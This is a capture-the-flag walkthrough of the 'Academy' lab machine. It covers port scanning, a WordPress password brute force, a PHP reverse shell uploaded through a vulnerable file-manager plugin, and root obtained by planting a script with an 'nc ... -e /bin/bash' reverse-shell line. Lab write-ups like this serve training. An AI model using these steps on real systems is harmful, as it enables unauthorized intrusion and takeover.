---
{"dg-publish":true,"permalink":"/write-ups/the-hackers-labs/academy/","tags":["CTF","write-up","#wordpress"]}
---


![Pasted image 20241211222106.png|400](/img/user/attachments/Pasted%20image%2020241211222106.png)

---

> [!INFO] Info about Academy
>  Linux

> [!FAQ]- Hints
> No Hints.

---
# Active reconnaissance
## Port scan
Perform a quick general scan on all ports.
```shell
sudo nmap TARGET_IP -n -p- -sS -Pn -vvv --open --min-rate 5000 -oN nmap_scan
```

```c
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

---
# Enumeration
Perform a deep scan with common scripts only on ports we are interested in.
```shell
sudo nmap TARGET_IP -sCV -p 22,80 -oN nmap_enum
```
## OS
Linux
## Port 22 - SSH
tcp open  ssh     **OpenSSH 9.2**p1 Debian 2+deb12u2 (protocol 2.0)
## Port 80 - Apache
tcp open  http    **Apache** httpd **2.4.59** ((Debian))
Add IP to */etc/hosts* (Optional)
```shell
sudo echo "192.168.122.4 academy.thl" | sudo tee -a /etc/hosts
```

![Pasted image 20241212104601.png](/img/user/attachments/Pasted%20image%2020241212104601.png)
### Fuzz
```shell
ffuf -c -t 100 -u http://academy.thl/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -mc all -fc 404 -e .php,.html,.txt
```
One important result *WordPress*
### Wordpress
Version 6.5.3
![Pasted image 20241212110945.png](/img/user/attachments/Pasted%20image%2020241212110945.png)
#### Fuzz
```shell
ffuf -c -t 100 -u http://academy.thl/wordpress/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -mc all -fc 404 -e .php,.html,.txt
```
Nothing important

---
# Vulnerability analysis
## Wordpress
#### Wpscan
```shell
wpscan --url 192.168.122.4/wordpress -e vp,u --api-token="554f34g5gfhdg" --plugins-detection aggressive
```

Usernames
- dylan

The version has some vulnerabilities
![Pasted image 20241212122111.png](/img/user/attachments/Pasted%20image%2020241212122111.png)

The plugin *file-manager* has some vulnerabilities
![Pasted image 20241212120332.png](/img/user/attachments/Pasted%20image%2020241212120332.png)


---
# Exploitation
## Brute force attack to wordpress
```shell
wpscan --url 192.168.122.4/wordpress -U dylan -P /usr/share/wordlists/rockyou.txt
```
![Pasted image 20241212122444.png](/img/user/attachments/Pasted%20image%2020241212122444.png)

Now I can log in to the admin panel
![Pasted image 20241212123656.png](/img/user/attachments/Pasted%20image%2020241212123656.png)
## File upload
I use the vulnerability from the vulnerability analysis section named *Bit File Manager – 100% Free & Open Source File Manager and Code Editor for WordPress < 6.5.6 - Authenticated (Subscriber+) Arbitrary File Upload*
1. Go to the plugin section
2. Open the plugin on home
   ![Pasted image 20241212124333.png](/img/user/attachments/Pasted%20image%2020241212124333.png)
3. Click on home again
   ![Pasted image 20241212124436.png](/img/user/attachments/Pasted%20image%2020241212124436.png)
4. Navigate to a folder that you can aaccess it, in my case `http://192.168.122.4/wordpress/wp-content/uploads/` and click on upload
   ![Pasted image 20241212124905.png](/img/user/attachments/Pasted%20image%2020241212124905.png)
5. Now upload a reverse shell for example, I use */usr/share/webshells/php/php-reverse-shell.php* changing the data
   ![Pasted image 20241212125052.png](/img/user/attachments/Pasted%20image%2020241212125052.png)
6. Start the listener
```shell
rlwrap nc -lnvp 4747
```
7. Go to the path of file `192.168.122.4/wordpress/wp-content/uploads/php-reverse-shell.php`
8. We have a reverse shell
   ![Pasted image 20241212125253.png](/img/user/attachments/Pasted%20image%2020241212125253.png)

---
# Privilege escalation
Checking the files, I notice that I can write into *opt*
![Pasted image 20241212184041.png](/img/user/attachments/Pasted%20image%2020241212184041.png)
Thereis a file *cackup.py*, the content is:
![Pasted image 20241212184317.png](/img/user/attachments/Pasted%20image%2020241212184317.png)
There are credentials, I test them with no successful results.
I assume that another user is possibly executing the script, I look for on *crontabs* but unsuccessful.
I used [[pspy\|pspy]] to check some root processes without need root privileges. Transfer the binary.
```shell
pspy
```
![Pasted image 20241212184909.png](/img/user/attachments/Pasted%20image%2020241212184909.png)

A user is executing a binary named *backup.sh* instead *backup.py*
Create a *backup.sh* on the *opt* directory with the follow content to send us a revere shell.
```shell
#!/bin/bash
nc 192.168.122.192 4748 -e /bin/bash
```

Now set the listener
```shell
rlwrap nc -lnvp 4748
```

Wait if some user execute this script and it works. Looks that the script is executing very minute.
![Pasted image 20241212185335.png](/img/user/attachments/Pasted%20image%2020241212185335.png)

> [!check] User flag
> ![Pasted image 20241212185547.png](/img/user/attachments/Pasted%20image%2020241212185547.png)

> [!check] Root flag
> ![Pasted image 20241212185422.png](/img/user/attachments/Pasted%20image%2020241212185422.png)

---